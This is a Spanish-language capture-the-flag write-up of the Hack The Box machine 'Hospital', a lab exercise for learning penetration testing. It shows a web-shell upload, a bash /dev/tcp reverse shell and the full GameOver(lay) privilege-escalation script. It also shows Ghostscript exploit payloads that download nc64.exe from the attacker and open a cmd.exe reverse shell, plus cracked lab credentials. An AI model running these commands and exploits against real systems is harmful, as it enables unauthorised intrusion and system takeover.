---
title: "Hospital - WriteUp"
date: Sun Dec 29 2024 15:45:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, cve-2023-32629, dirb, winrm, cve-2023-2640, powershell, ssh, linpeas]
image: /assets/img/htb-writeups/Pasted image 20231207112131.png
---

{% include machine-info.html
  machine="Hospital"
  os="Windows"
  difficulty="Medium"
  platform="HTB"
%}

![Hospital](/assets/img/htb-writeups/Pasted image 20231207112131.png)

Tags:  

------

Máquina Windows
Dificultad Media

------

NMAP

```bash
# Nmap 7.94SVN scan initiated Wed Dec  6 19:58:34 2023 as: nmap -sCV -p 22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6067,6404,6406,6407,6409,6612,6636,8080,9389 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.50.45
Nmap scan report for 10.129.50.45
Host is up (0.12s latency).

PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-12-07 01:58:41Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2023-09-05T18:39:34
|_Not valid after:  2024-03-06T18:39:34
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-12-07T01:59:38+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6067/tcp open  msrpc             Microsoft Windows RPC
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6612/tcp open  msrpc             Microsoft Windows RPC
6636/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-server-header: Apache/2.4.55 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Login
|_Requested resource was login.php
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2023-12-07T01:59:38
|_  start_date: N/A
```

Detectado nombre DNS _DC.hospital.htb_ y _HOSPITAL_- Se actualiza archivo hosts.

HTTP

Tenemos un panel de login de correo RoundCube.

```http
https://hospital.htb/
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207112131.png)

Acceso de usuario de la web del hospital

```http
http://10.129.229.189:8080/login.php
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207112410.png)

Nos creamos una cuenta y cuando accedemos con las credenciales creadas, accedemos a un panel de subida de archivos.

```http
http://10.129.229.189:8080/index.php
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207112548.png)

La intrusión puede venir por aquí. Pero vamos a seguir enumerando.

FUZZING

```bash
$ gobuster dir -u http://10.129.229.189:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207120221.png)

Encontramos el nombre de la ruta donde supuestamente se subirán los archivos.

Abrimos BurpSuite para ver la forma en la que los archivos se suben.

En este caso voy a probar con un archivo de texto con el contenido "hola caracola"

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207120639.png)

Todo bien. Vamos a ver ahora si lo almacena en la carpeta /uploads

```http
http://10.129.229.189:8080/uploads/test.txt
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207120803.png)

Pues parece que sí. Ahora vamos a probar de subir archivos maliciosos para ver en qué formato se lo traga...

Después de hacer pruebas con _BurpSuite_, uno de los formatos que se traga es .phar. Ahora lo que nos hace falta es un buen script PHP para subir y empezar la explotación.

Un script muy bueno es _p0wny-shell_ > https://github.com/flozz/p0wny-shell

Nos lo descargamos lo renombramos a .phar lo subimos.

Nos vamos a la URL de /uploads seguido del nombre del archivo. En mi caso es _shell.phar_.

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207122843.png)

Estamos dentro. Empezamos a enumerar

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207125128.png)

Descubrimos unas credenciales:

```http
root:my$qls3rv1c3!
```

Vamos a enviarnos una shell remota, nos ponemos a la escucha con nc (en mi caso por el puerto 443) y en la web escribimos lo siguiente:

```bash
$ /usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.68/443 0>&1'
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207125736.png)

Dentro. Ponemos la terminal full interactiva y continuamos...

Lo primero que hay que decir es que estamos en un contenedor dentro del host principal, tendremos que escapar o conseguir credenciales que nos permitan conectar con éste. 

Vamos a explorar la BBDD ya que conocemos los datos de acceso.

```bash
$ mysql -u root -p
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207130431.png)

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207130602.png)

Copiamos los hashes y vamos a intentar romperlos con _hashcat_:

```bash
$ hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207131501.png)

```http
admin:123456
```

Creo que esto nos va a servir de poco o nada...

Vamos a enumerar el sistema.

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207132036.png)

Buscamos exploits de kernel y encontramos una vulnerabilidad que afecta a esta versión:

https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207132249.png)

Nos bajamos el exploit y lo subimos a la máquina mediante _wget_

```bash
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c
'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207132836.png)

Perfecto! ha funcionado. Ahora a escapar de aquí...

Nos subimos _pspy_ y _linpeas.sh_

Usuarios:
```http
drwilliams
root
```

Encontramos el hash del usuario _drwilliams_ en el archivo /etc/shadow

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207141331.png)

Lo copiamos y se lo damos a nuestro amigo _john_ para ver qué puede hacer con él:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashv6
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207141442.png)

Y nos lo encuentra! Tenemos nuestras primeras credenciales!

```http
drwilliams:qwe123!@#
```

Vamos a probar las credenciales en el servidor de correo RoundCube:

```http
https://hospital.htb/
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207160513.png)

Entramos y tenemos una pista de como seguir...

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207160800.png)

Nos pide un diseño en formato .eps para que lo pueda abrir con el programa _GhostScript_

Y encontramos esto: https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207161224.png)

Nos lo descargamos y lo probamos.

Ahora lo que tenemos que hacer es generar un archivo _file.eps_ con los comandos que queremos que se ejecuten. En total serán dos, uno para que se descargue el binario _nc64.exe_ desde nuestra máquina con _curl_ y el segundo comando para que nos envíe una reverser shell con el binario descargado.

Para ello copiaremos el binario _nc64.exe_ carpeta de trabajo y en esa misma carpeta levantaremos un servicio web con Python mismo para que nos coja el archivo.

En otra terminal nos pondremos a la escucha también con _netcat_ en el puerto que le hayamos indicado.

Una vez que tengamos todo preparado es hora de preparar el archivo _.eps_ malicioso que le enviaremos por correo.

Abrimos otra terminal en la carpeta del exploit y escribimos lo siguiente siguiendo las indicaciones del exploit:

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207195330.png)

```bash
$ python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.68:8000/nc64.exe -o nc.exe" --filename file.eps
...
$ python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.68 4444 -e cmd.exe" --filename file.eps
...
```

Una vez generado el archivo _file.eps_ se lo enviaremos por correo a _drbrown@hospital.htb_ desde la web de RoundCube del hospital.

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207190428.png)

Lo enviamos y nos quedamos a la espera...

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207192439.png)

Y después de unos minutos tenemos la shell...

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207202747.png)

NOTA: Si no funcionara con los dos comando a la vez podemos enviar dos correos con un comando en el adjunto _file.eps_ cada vez.

Nada más entrar encontramos la contraseña del usuario _drbrown_ en un archivo .bat

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207203417.png)

El .bat es este:
```PowerShell
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

Credenciales:

```http
drbrown:chr!$br0wn
```

Las comprobamos:

```bash
$ crackmapexec winrm 10.129.229.189 -u drbrown -p 'chr!$br0wn'
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207204046.png)

Bingo! Tenemos credenciales para administración remota!

Vamos a conectar por RDP y así podremos enumerar mejor el equipo aprovechando que tiene el servicio activo

Pero al conectar nos llevamos una sorpresa, y es que corre un script de escritura automática en la que teclea los credenciales de administrador!

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207205834.png)

Apuntamos la credenciales

```http
Administrator:Th3B3stH0sp1t4l9786!
```

Entramos:

```bash
$ evil-winrm -i 10.129.229.189 -u 'Administrator' -p 'Th3B3stH0sp1t4l9786!'
```

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207210107.png)

P0wned!!!

--------

ANEXO
Caminos errados:

------------------------

```bash
$ rpcclient -U 'drwilliams%qwe123!@#' 10.129.48.224 -c 'enumdomusers'
...
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[$431000-R1KSAI1DGHMH] rid:[0x464]
user:[SM_0559ce7ac4be4fc6a] rid:[0x465]
user:[SM_bb030ff39b6c4a2db] rid:[0x466]
user:[SM_9326b57ae8ea44309] rid:[0x467]
user:[SM_b1b9e7f83082488ea] rid:[0x468]
user:[SM_e5b6f3aed4da4ac98] rid:[0x469]
user:[SM_75554ef7137f41d68] rid:[0x46a]
user:[SM_6e9de17029164abdb] rid:[0x46b]
user:[SM_5faa2be1160c4ead8] rid:[0x46c]
user:[SM_2fe3f3cbbafa4566a] rid:[0x46d]
'user:[drbrown] rid:[0x641]'
user:[drwilliams] rid:[0x642]
```

Encontramos nuevo usuario _drbrown_

Seguimos enumerando, ahora le toca el turno a _ldap_:

```bash
$ ldapdomaindump -u 'hospital.htb\drwilliams' -p 'qwe123!@#' ldaps://10.129.48.224
```

Montamos un servicio web y examinamos los archivos generados.

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207151827.png)

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207151604.png)

Tenemos que intentar encontrar las credenciales de este usuario o escalar a él, ya que tiene permisos de acceso remoto y logs.

Vamos aprobar con _BloodHound_ a ver si vemos otro vector de ataque.

```bash
bloodhound-python -u drwilliams -p 'qwe123!@#' -ns 10.129.48.224 -d hospital.htb -c all
```

Ahora lanzamos Bloodhound y cargamos los datos obtenidos:

```bash
$ sudo neo4j start
$ bloodhound
```

Pero tampoco vemos nada que nos lleve a escalar de usuario...

![HOSPITAL](/assets/img/htb-writeups/Pasted image 20231207160152.png)
---

**Última actualización**: 2024-12-29<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
